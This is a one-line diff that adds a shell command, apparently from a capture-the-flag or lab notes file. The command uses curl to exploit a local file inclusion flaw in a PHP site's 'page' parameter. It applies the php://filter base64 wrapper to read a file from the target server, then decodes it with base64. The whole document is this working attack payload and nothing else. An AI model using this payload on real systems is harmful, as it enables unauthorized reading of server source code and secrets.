@@ -1,0 +1,1 @@
+curl --silent "http://$IP/index.php?page=php://filter/convert.base64-encode/resource=letak_yg_dicat" | base64 -d
